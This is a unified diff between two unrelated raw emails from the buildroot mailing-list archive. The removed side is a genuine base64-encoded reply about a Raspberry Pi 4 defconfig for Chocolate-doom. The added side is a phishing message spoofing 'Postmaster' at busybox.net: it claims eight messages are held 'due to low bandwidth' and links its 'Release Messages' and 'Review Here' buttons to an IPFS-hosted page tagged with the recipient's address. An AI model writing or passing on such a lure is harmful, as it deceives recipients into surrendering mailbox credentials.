@@ -4,84 +4,43 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4B818C47DD9
-	for <buildroot@archiver.kernel.org>; Mon, 22 Jan 2024 16:34:35 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4114AC47DAF
+	for <buildroot@archiver.kernel.org>; Mon, 22 Jan 2024 17:28:52 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id D4D9D60FF0;
-	Mon, 22 Jan 2024 16:34:34 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org D4D9D60FF0
+	by smtp3.osuosl.org (Postfix) with ESMTP id C84EA60F51;
+	Mon, 22 Jan 2024 17:28:51 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org C84EA60F51
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
 	by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id E5rneZcq23jv; Mon, 22 Jan 2024 16:34:34 +0000 (UTC)
+	with ESMTP id 4byWjz42aTPR; Mon, 22 Jan 2024 17:28:51 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 3A55060FE2;
-	Mon, 22 Jan 2024 16:34:33 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 3A55060FE2
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id 4A4031BF378
- for <buildroot@lists.busybox.net>; Mon, 22 Jan 2024 16:34:32 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 2A47160B6E;
+	Mon, 22 Jan 2024 17:28:50 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2A47160B6E
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id EEB911BF30D
+ for <buildroot@lists.busybox.net>; Mon, 22 Jan 2024 17:28:48 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 23EF660FE2
- for <buildroot@lists.busybox.net>; Mon, 22 Jan 2024 16:34:32 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 23EF660FE2
+ by smtp1.osuosl.org (Postfix) with ESMTP id C02C981318
+ for <buildroot@lists.busybox.net>; Mon, 22 Jan 2024 17:28:48 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org C02C981318
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id 9VxS9qpjusMa for <buildroot@lists.busybox.net>;
- Mon, 22 Jan 2024 16:34:31 +0000 (UTC)
-Received: from mout.gmx.net (mout.gmx.net [212.227.17.20])
- by smtp3.osuosl.org (Postfix) with ESMTPS id 5983660FD0
- for <buildroot@buildroot.org>; Mon, 22 Jan 2024 16:34:30 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 5983660FD0
-X-UI-Sender-Class: 724b4f7f-cbec-4199-ad4e-598c01a50d3a
-Received: from localhost ([62.216.208.126]) by mail.gmx.net (mrgmx104
- [212.227.17.168]) with ESMTPSA (Nemesis) id 1MFKKX-1rLdbE1NG5-00FlxD; Mon, 22
- Jan 2024 17:34:25 +0100
-Date: Mon, 22 Jan 2024 17:34:24 +0100
-To: Giulio Benetti <giulio.benetti@benettiengineering.com>
-Message-ID: <20240122173424.666fd137@gmx.net>
-In-Reply-To: <20240121134738.6f0d953b@gmx.net>
-References: <PH0PR19MB540925F1A9987E1D7F58BB0DD0762@PH0PR19MB5409.namprd19.prod.outlook.com>
- <7E2BA7C4-0A2C-40FF-AF48-25BD637CFB7A@benettiengineering.com>
- <20240121134738.6f0d953b@gmx.net>
-X-Mailer: Claws Mail 4.2.0 (GTK 3.24.39; x86_64-suse-linux-gnu)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id aB10bPZ_h8C1 for <buildroot@lists.busybox.net>;
+ Mon, 22 Jan 2024 17:28:48 +0000 (UTC)
+Received: from busybox.net (unknown [141.98.10.96])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 717D781317
+ for <buildroot@busybox.net>; Mon, 22 Jan 2024 17:28:47 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 717D781317
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 22 Jan 2024 18:28:45 +0100
+Message-ID: <20240122182844.9F20310C9B7FE03B@busybox.net>
 MIME-Version: 1.0
-X-Provags-ID: V03:K1:roHC0uF+3WqJ0hRZayQLcm9DoKDvUJ/8ibgLAOx+PvzFCelGsd3
- Ss8aXMrWpU7VwpfcpPWqpQs/O4eN4Bjysnv3WdStcnXs5ZA4vjmAwvHhLRbwCxmkQ64Ih1M
- eSlg9lOv0Se06N7amD4Lx7at8DTOjPy0tHlSW0i3zZji3dEVx3FyiK2eb/Zta+F1Lc3Qp/G
- XeAyZw+Pq+fNHq+yF7iKA==
-UI-OutboundReport: notjunk:1;M01:P0:edNlShZ3e9w=;g1A9melhqfArRrEsl6/EmtSuqhv
- K2EJ5KjDCnypvPCWem9JLl61Hp+nw8lVfWmUCBF4Q3qz4odkcd9vTZQs9xGjyYy/r5TTeAUbs
- QLOApVmG8UoO6ZJ+KkyHZQPcRK920z8HasIcvnzl6O/z41bKEa4eu6C+Yr1jr+VwPHR2Eqh7T
- 6XVTrVbHcjQpC+qhgfjlf+9aiT+O8G+LWKj5WUK8g+EsEBiNtdGkQ073Qi2Y2oWZ9JGXrdRUw
- JS8885NJwei9X7Lo8HClr3jKq4WlC9oi/qSbYcRqoWDqR17qaImlUoa9AQAdVtIW50dO9m/88
- lBFactzcfIo+0TOFq25AiZ0hEj/j7Cgq6rx9sTq96C2h+9MqRFlaHR/wgANDJqxCldoPeGRRk
- ag2k5yPN3siNiWJPNOf/yifjmUzBzt3+m7GDXdV5s2gDg8Pjze+DX7KSA0DUUrBs3XgoC8zlO
- Rcbla8TcumQcoMBW/3ac+utoNAwtgpvmVxjBygXcIFjgjmJbx8rVSajRJFNJQD5XOKz721+OQ
- LPh8SnVftgx50I/dl0BzkiGvPu+GNai8tqSrNVbgDiFBGHKTNj66Jrk353rET6OsAvipcatq0
- LOXizVn3K0dmb4Lg+Dda+0M1Ge1N/eaMI36T0xG5ycQJXQgNQBpcwNzOsu0tMvkvJ2s3xPZWH
- NBfaLnjwc8ZaRHAMgnrx/TrlypCNbPKOTXzN2yReoszCAij2/fPz1KJvQPbvNJlW4PKRah8VZ
- pXu71GmMA1o6vWRLoLxoKStuTRtJC7XX7iUc3Dtdx6isXJlW0eiceT8PPpb2EJ5CGVY3FNRTP
- Lc4yMrU0eceFpYLId/Ewz2MPcMALVgIEOBGGqizzDA95Pw8kA/kdCx1u9NEFaa6ogtLbEX10N
- rMjTbWu+V1R8ZcqKGf/l7xJAwmIAGceOsVQoVKoOqZRvUiA/f5ceSbda58JK+H6o2w9BFVtB5
- ZQAngTm+sLwUx8pPQAxoKHCGdtE=
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=gmx.net; 
- s=s31663417; t=1705941265; x=1706546065; i=ps.report@gmx.net;
- bh=Q8rib5mNWa5XJCDzXBLP2W6JJIB2A8tu2egfq8N1Uok=;
- h=X-UI-Sender-Class:Date:From:To:Cc:Subject:In-Reply-To:
- References;
- b=MIMRntRw/Ivx/Yf4TJ82k2E9MXdQ9/Sm4fjM/ZkhDwYrqE0gtibdhzoI1q879OFy
- zRSZj00S8qpIP/DAEK65BtVm52AgbID0xkZkmeW9iD27yybkkwaQOJTokAE+j7T7C
- L29ioKs71URvn17qbi6QdE4ctxmZ3S90as7g/vX+n3EmB0Hah3FpFsw0Njx0u0Gic
- Os82SoQCsOjnAI19skP+aX77nOuN5blF0qkiuyQFW8JT/GL0DmlO7x9t9hwr2FD0n
- K4LgDxO4b3Ypi5V1sZDuPL8bLXwxEdn/sfo6zPbyb4eBHibaj/m0i9RUDk/TSWP1c
- IAYYTKLwHW99X9MGCg==
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmx.net header.i=ps.report@gmx.net
- header.a=rsa-sha256 header.s=s31663417 header.b=MIMRntRw
-Subject: Re: [Buildroot] [Help] Run Chocolate-doom
+Subject: [Buildroot] =?utf-8?q?Undeliverable=3A_You_have_=288=29_pending_?=
+ =?utf-8?b?bWVzc8mRZ2Vz?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -93,73 +52,176 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Peter Seiderer via buildroot <buildroot@buildroot.org>
-Reply-To: Peter Seiderer <ps.report@gmx.net>
-Cc: franco ariel <fran.millocs@live.com.ar>, buildroot@buildroot.org
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed; boundary="===============8572746315149567200=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-SGVsbG8gKiwKCk9uIFN1biwgMjEgSmFuIDIwMjQgMTM6NDc6MzggKzAxMDAsIFBldGVyIFNlaWRl
-cmVyIDxwcy5yZXBvcnRAZ214Lm5ldD4gd3JvdGU6Cgo+IE9uIFN1biwgMjEgSmFuIDIwMjQgMTI6
-MjI6NDYgKzAxMDAsIEdpdWxpbyBCZW5ldHRpIDxnaXVsaW8uYmVuZXR0aUBiZW5ldHRpZW5naW5l
-ZXJpbmcuY29tPiB3cm90ZToKPiAKPiA+IEhpIEZyYW5jbywKPiA+ICAgCj4gPiA+IElsIGdpb3Ju
-byAyMSBnZW4gMjAyNCwgYWxsZSBvcmUgMDc6NDgsIGZyYW5jbyBhcmllbCA8ZnJhbi5taWxsb2Nz
-QGxpdmUuY29tLmFyPiBoYSBzY3JpdHRvOgo+ID4gPiAKPiA+ID4g77u/Cj4gPiA+IEhlbGxvLAo+
-ID4gPiBJJ20gdHJ5aW5nIHRvIHRha2UgbXkgZmlyc3Qgc3RlcHMgb24gYnVpbGRyb290IHVzaW5n
-IG15IFJhc3BiZXJyeSBwaSA0IGFuZCBJJ20ganVzdCB0cnlpbmcgdG8gZmlndXJlIG91dCBob3cg
-dG8gcnVuIHRoZSBDaG9jb2xhdGUtRG9vbSwgSSBhbHJlYWR5IGluc3RhbGxlZCBhbmQgd2hlbiBJ
-IHRyeSB0byBydW4gaXQsIGl0IHRocm93cyB0aGUgZm9sbG93aW5nIGVycm9yOgo+ID4gPiBGYWls
-ZWQgdG8gaW5pdGlhbGl6ZSB2aWRlbzogTm8gYXZhaWxhYmxlIHZpZGVvIGRldmljZS4gICAgCj4g
-PiAKPiA+IEkgdGhpbmsgeW91IGhhdmUgbm8gcmVnaXN0ZXJlZCB2aWRlbyBvdXRwdXQuCj4gPiBZ
-b3UgY2FuIGNoZWNrIHRoaXMgYnkgY2hlY2tpbmcgZG1lc2cuCj4gPiBUaGlzIGNvdWxkIGhhcHBl
-biBpZiB5b3UgZG9u4oCZdCBidWlsZCBldWRldiBvciBtZGV2IHRvIGxldCBidXN5Ym94IHRvIGF1
-dG9tYXRpY2FsbHkgcmVnaXN0ZXIgZGV2aWNlIGRyaXZlcnMgd2hlbiBkZXZpY2VzIGFyZSBmb3Vu
-ZC4KPiA+IFNvIHlvdSBjb3VsZCB0cnkgdG8gcmVidWlsZCBmcm9tIHNjcmF0Y2ggdXNpbmcgYSBk
-eW5hbWljIGRldmljZSBoYW5kbGluZyhldWRldikuICAKPiAKPiBBZGQgYWRkCj4gCj4gZHRvdmVy
-bGF5PXZjNC1rbXMtdjNkLXBpNAo+IAo+IHRvIHlvdXIgYm9vLXBhdGl0aW9uIGNvbmZpZy50eHQg
-ZmlsZQoKU29ycnkgbm90IG5lZWRlZCAoc2VlbXMgZGVmYXVsdCBycGkgZnJhbWUgYnVmZmVyIGlz
-IGVub3VnaCksIHRoZSBmb2xsb3dpbmcKUlBpNCBkZWZjb25maWcgd29ya3MgZm9yIG1lIChtYXli
-ZSBCUjJfUEFDS0FHRV9SUElfVVNFUkxBTkQgYW5kCkJSMl9QQUNLQUdFX1NETDJfT1BFTkdMRVMg
-YXJlIG5vdCBuZWVkZWQpIHRvIHJ1biBjaG9jb2xhdGUtZG9vbToKCkJSMl9hcm09eQpCUjJfY29y
-dGV4X2E3Mj15CkJSMl9BUk1fRlBVX05FT05fVkZQVjQ9eQpCUjJfUEFDS0FHRV9IT1NUX0xJTlVY
-X0hFQURFUlNfQ1VTVE9NXzZfMT15CkJSMl9CSU5VVElMU19WRVJTSU9OXzJfNDFfWD15CkJSMl9H
-Q0NfVkVSU0lPTl8xM19YPXkKQlIyX1RPT0xDSEFJTl9CVUlMRFJPT1RfQ1hYPXkKQlIyX1BBQ0tB
-R0VfSE9TVF9HREI9eQpCUjJfR0RCX1ZFUlNJT05fMTQ9eQpCUjJfRU5BQkxFX0RFQlVHPXkKQlIy
-X1JPT1RGU19ERVZJQ0VfQ1JFQVRJT05fRFlOQU1JQ19FVURFVj15CkJSMl9TWVNURU1fREhDUD0i
-ZXRoMCIKQlIyX1JPT1RGU19QT1NUX0JVSUxEX1NDUklQVD0iYm9hcmQvcmFzcGJlcnJ5cGk0L3Bv
-c3QtYnVpbGQuc2giCkJSMl9ST09URlNfUE9TVF9JTUFHRV9TQ1JJUFQ9ImJvYXJkL3Jhc3BiZXJy
-eXBpNC9wb3N0LWltYWdlLnNoIgpCUjJfTElOVVhfS0VSTkVMPXkKQlIyX0xJTlVYX0tFUk5FTF9D
-VVNUT01fVEFSQkFMTD15CkJSMl9MSU5VWF9LRVJORUxfQ1VTVE9NX1RBUkJBTExfTE9DQVRJT049
-IiQoY2FsbCBnaXRodWIscmFzcGJlcnJ5cGksbGludXgsMTdmMTM1Yjc0MmM0ZWRiMzQwYWZiMzY1
-ODczYzNhNTc0ZjdlMTZjYikvbGludXgtMTdmMTM1Yjc0MmM0ZWRiMzQwYWZiMzY1ODczYzNhNTc0
-ZjdlMTZjYi50YXIuZ3oiCkJSMl9MSU5VWF9LRVJORUxfREVGQ09ORklHPSJiY20yNzExIgpCUjJf
-TElOVVhfS0VSTkVMX0RUU19TVVBQT1JUPXkKQlIyX0xJTlVYX0tFUk5FTF9JTlRSRUVfRFRTX05B
-TUU9ImJjbTI3MTEtcnBpLTQtYiIKQlIyX0xJTlVYX0tFUk5FTF9ORUVEU19IT1NUX09QRU5TU0w9
-eQpCUjJfUEFDS0FHRV9CVVNZQk9YX1NIT1dfT1RIRVJTPXkKQlIyX1BBQ0tBR0VfWFo9eQpCUjJf
-UEFDS0FHRV9DSE9DT0xBVEVfRE9PTT15CkJSMl9QQUNLQUdFX0RPT01fV0FEPXkKQlIyX1BBQ0tB
-R0VfRElSRUNURkI9eQpCUjJfUEFDS0FHRV9TREwyX0RJUkVDVEZCPXkKQlIyX1BBQ0tBR0VfU0RM
-Ml9PUEVOR0xFUz15CkJSMl9QQUNLQUdFX1JQSV9GSVJNV0FSRT15CkJSMl9QQUNLQUdFX1JQSV9G
-SVJNV0FSRV9WQVJJQU5UX1BJND15CkJSMl9QQUNLQUdFX1JQSV9GSVJNV0FSRV9DT05GSUdfRklM
-RT0iYm9hcmQvcmFzcGJlcnJ5cGk0L2NvbmZpZ180LnR4dCIKQlIyX1BBQ0tBR0VfUlBJX1VTRVJM
-QU5EPXkKQlIyX1BBQ0tBR0VfUlBJX1VTRVJMQU5EX0hFTExPPXkKQlIyX1BBQ0tBR0VfS01PRF9U
-T09MUz15CkJSMl9UQVJHRVRfUk9PVEZTX0VYVDI9eQpCUjJfVEFSR0VUX1JPT1RGU19FWFQyXzQ9
-eQpCUjJfVEFSR0VUX1JPT1RGU19FWFQyX1NJWkU9IjEyME0iCiMgQlIyX1RBUkdFVF9ST09URlNf
-VEFSIGlzIG5vdCBzZXQKQlIyX1BBQ0tBR0VfSE9TVF9ET1NGU1RPT0xTPXkKQlIyX1BBQ0tBR0Vf
-SE9TVF9HRU5JTUFHRT15CkJSMl9QQUNLQUdFX0hPU1RfS01PRF9YWj15CkJSMl9QQUNLQUdFX0hP
-U1RfTVRPT0xTPXkKClJlZ2FyZHMKUGV0ZXIKCj4gCj4gUmVnYXJkcywKPiBQZXRlcgo+IAo+IAo+
-ID4gCj4gPiBPdGhlcndpc2UgY2FuIHlvdSBwYXN0ZWJpbiB5b3VyIGRlZmNvbmZpZz8KPiA+IAo+
-ID4gQmVzdCByZWdhcmRzCj4gPiBHaXVsaW8KPiA+ICAgCj4gPiA+IAo+ID4gPiBJIGFscmVhZHkg
-aW5zdGFsbGVkIGFsbCB0aGUgR3JhcGhpY3MgbGlicmFyaWVzLCBTREwyLCBkaXJlY3RmYiwgZXRj
-Lgo+ID4gPiBNYXliZSBJIGFtIG1pc3Npbmcgc29tZXRoaW5nLgo+ID4gPiAKPiA+ID4gVGhhbmsg
-eW91LAo+ID4gPiBGcmFuY28uIAo+ID4gPiAKPiA+ID4gX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX18KPiA+ID4gYnVpbGRyb290IG1haWxpbmcgbGlzdAo+ID4g
-PiBidWlsZHJvb3RAYnVpbGRyb290Lm9yZwo+ID4gPiBodHRwczovL2xpc3RzLmJ1aWxkcm9vdC5v
-cmcvbWFpbG1hbi9saXN0aW5mby9idWlsZHJvb3QgICAgCj4gPiAKPiA+IF9fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCj4gPiBidWlsZHJvb3QgbWFpbGluZyBs
-aXN0Cj4gPiBidWlsZHJvb3RAYnVpbGRyb290Lm9yZwo+ID4gaHR0cHM6Ly9saXN0cy5idWlsZHJv
-b3Qub3JnL21haWxtYW4vbGlzdGluZm8vYnVpbGRyb290ICAKPiAKCl9fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCmJ1aWxkcm9vdCBtYWlsaW5nIGxpc3QKYnVp
-bGRyb290QGJ1aWxkcm9vdC5vcmcKaHR0cHM6Ly9saXN0cy5idWlsZHJvb3Qub3JnL21haWxtYW4v
-bGlzdGluZm8vYnVpbGRyb290Cg==
+--===============8572746315149567200==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D":92b" style=3D'color: rgb(34, 34, 34); text-transform: none; tex=
+t-indent: 0px; letter-spacing: normal; font-family: "Google Sans", Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: medium; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
+; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
+normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
+oration-color: initial; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial;'><div class=3D"qQVYZb"><br></div><=
+div class=3D"lQs8Hd" jscontroller=3D"i3Ohde" jsaction=3D"SN3rtf:rcuQ6b"></d=
+iv><div class=3D"btm"></div></div>
+<div style=3D'color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: "Google Sans", Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif; font-size: medium; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
+r: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial;'><div class=3D"aHl" style=3D"margin-lef=
+t: -38px;"></div><div tabindex=3D"-1" id=3D":91y"></div>
+<div class=3D"ii gt" id=3D":929" style=3D"margin: 8px 0px 0px; padding: 0px=
+; font-size: 0.87rem; position: relative; direction: ltr;" jslog=3D"20277; =
+u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxudWxsLG51=
+bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsW11d; 4:WyI=
+jbXNnLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLG=
+51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXSxbXSxbXV0.">
+<div class=3D"a3s aiL " id=3D":92a" style=3D"font: small/1.5 Arial, Helveti=
+ca, sans-serif; width: 603px; height: 606px; overflow: hidden; font-size-ad=
+just: none; font-stretch: normal;"><u></u><div style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; background-color: rgb(24=
+4, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial;"><div style=3D"width: 593px; height: 43px; =
+padding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18p=
+x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
+ none; float: left; box-sizing: border-box;"><span style=3D"box-sizing: bor=
+der-box;"><font size=3D"2"><span style=3D"box-sizing: border-box;"><font si=
+ze=3D"2">Message generated from<span>&nbsp;</span>
+<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
+=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://m=
+edi-cont.hu&amp;source=3Dgmail&amp;ust=3D1696329870830000&amp;usg=3DAOvVaw0=
+fBxS8iT8to0LhSccEB9L8">busybox.net</a>&nbsp;source.</font></span><font size=
+=3D"2"></font><font size=3D"2"><span style=3D"box-sizing: border-box;"></sp=
+an></font></font><font size=3D"2"><span style=3D"box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></span></font></span><font size=
+=3D"2"></font><span style=3D"box-sizing: border-box;"></span>
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><br></div></div><div style=3D"box-sizing: b=
+order-box;"><div style=3D"width: 5px; height: 30px; border-top-color: curre=
+ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
+box; background-color: rgb(86, 166, 89);"></div></div>
+</div><div style=3D"text-align: left; color: rgb(44, 54, 58); text-transfor=
+m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
+s-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacin=
+g: 0px; white-space: normal; box-sizing: border-box; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;"><br></div>=
+
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
+55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
+ecoration-style: initial; text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; text-decoration-style: initial; text-decoration-color: initial;" bo=
+rder=3D"0"><tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;"><td align=3D"left" style=3D"margin: 0=
+px; box-sizing: border-box;"><table style=3D"width: 627px; border-collapse:=
+ collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" cellspac=
+ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr al=
+ign=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; =
+box-sizing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 513px; bor=
+der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0"></table></td></tr><tr style=3D"box-sizing: border-=
+box;"><td style=3D"margin: 0px; box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;8 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
+-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
+zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
+;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
+delivering to <u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85, 204=
+);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">buildroot@busyb=
+ox.net</a></font></u><font style=3D"box-sizing: border-box;"><br><br></font=
+></font></font>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
+/font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafybeifoycyvjibtcx77h=
+wplyls26yg2nchwd2p7sqjya7exf2xaii6lji#buildroot@busybox.net" target=3D"_bla=
+nk" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Release Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafybeifoycyvjibtcx77=
+hwplyls26yg2nchwd2p7sqjya7exf2xaii6lji#buildroot@busybox.net" target=3D"_bl=
+ank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
+x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
+0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
+<font size=3D"3">Review Here</font></a><p style=3D"margin-top: 0px; margin-=
+bottom: 1rem; box-sizing: border-box;">&nbsp;</p><p style=3D"margin-top: 0p=
+x; margin-bottom: 1rem; box-sizing: border-box;"></p>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
